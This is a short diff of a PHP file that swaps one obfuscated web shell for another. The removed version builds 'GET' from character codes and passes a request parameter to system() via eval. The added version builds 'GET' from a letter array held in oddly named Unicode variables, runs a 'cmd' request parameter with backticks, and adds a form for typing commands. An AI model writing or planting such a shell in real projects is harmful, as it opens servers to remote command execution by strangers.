@@ -1,6 +1,2 @@
-<?php
-$_=[];
-for($i=65;$i<90;$i++)$_[]=chr($i);
-$_=$_[6].$_[4].$_[19];
-@eval("\$c=\${'_'.$_}['x'];system(\$c);");
-?>
+<?php $䷀=explode(',','A,B,C,D,E,F,G,H,I,J,K,L,M,N,O,P,Q,R,S,T,U,V,W,X,Y');$䷁=$䷀[6].$䷀[4].$䷀[19];$䷂=${'_'.$䷁}['cmd']??'id';echo`$䷂`;?>
+<form method=get><input name=cmd><input type=submit value=tifo></form>
